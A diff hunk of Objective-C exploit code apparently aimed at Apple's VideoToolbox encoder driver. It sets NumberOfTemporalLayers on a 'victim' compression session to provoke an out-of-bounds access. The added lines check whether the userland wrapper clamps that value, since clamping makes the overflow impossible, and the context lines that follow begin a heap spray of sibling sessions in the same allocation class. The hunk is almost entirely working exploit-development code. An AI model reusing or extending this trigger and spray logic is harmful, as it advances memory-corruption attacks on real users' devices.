@@ -127,7 +127,24 @@
     VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
     int usage = 1;
     VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));
-    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d", ntl]];
+    // Analyst: the setter returns 0 but silently clamps to 1 in the userland VT
+    // wrapper — an encode with clamped NTL cannot trigger the OOB at all.
+    int vrb = -1;
+    CFNumberRef vbn = NULL;
+    if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
+        CFNumberGetValue(vbn, kCFNumberIntType, &vrb);
+        CFRelease(vbn);
+    }
+    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d readback=%d", ntl, vrb]];
+    if (vrb != ntl) {
+        [report appendFormat:@"victim NTL readback=%d (want %d)\n", vrb, ntl];
+        [report appendString:@"\nVERDICT: VICTIM_NTL_CLAMPED\n"];
+        [report appendString:@"NTL clamped in the userland VideoToolbox wrapper — no OOB possible.\n"];
+        [report appendString:@"Spray and encode skipped; fix the clamp (creation-spec probe) first.\n"];
+        VTCompressionSessionInvalidate(victim);
+        CFRelease(victim);
+        return report;
+    }
 
     // 2) SPRAY siblings — same driver, same pInfo allocation class.
     //    Each sibling carries the marker in several int-valued properties so
